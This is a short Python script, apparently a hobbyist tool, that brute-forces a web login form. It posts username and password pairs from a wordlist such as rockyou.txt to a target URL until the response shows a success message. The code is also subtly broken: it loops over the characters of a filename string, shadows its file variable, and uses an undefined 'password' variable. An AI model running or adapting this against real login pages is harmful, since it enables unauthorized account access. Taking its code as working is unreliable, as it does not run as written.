# web login brute forcer

import requests
import sys

target = 'http://127.0.0.1:5000' # Change this.
usernames = 'usernames.txt' # Wordlist or a dictonary of names can be used here.
passwords = 'rockyou.txt'
needle = "Welcome back" # This is the message you get when you successfully login.

for username in usernames:
	with open(passwords, 'r') as passwords_list:
		for passwords in passwords_list:
			password = password.strip('\n').encode()
			sys.stdout.write('[X] Attempting user:password -> {}:{}\r'.format(username, password.decode()))
			r = requests.post(target, data={'username': username, 'password': password})
			if needle.encode() in r.content:
				sys.stdout.write('\n')
				sys.stdout.write('\t[>>>>>>] Valid password "{}" found for user"{}"!'.format(password.decode(), username))
				sys.exit()
			sys.stdout.flush()
			sys.stdout.write('\n')
			sys.stdout.write('\tNo password found for "{}"!'.format(username))
			sys.stdout.write('\n')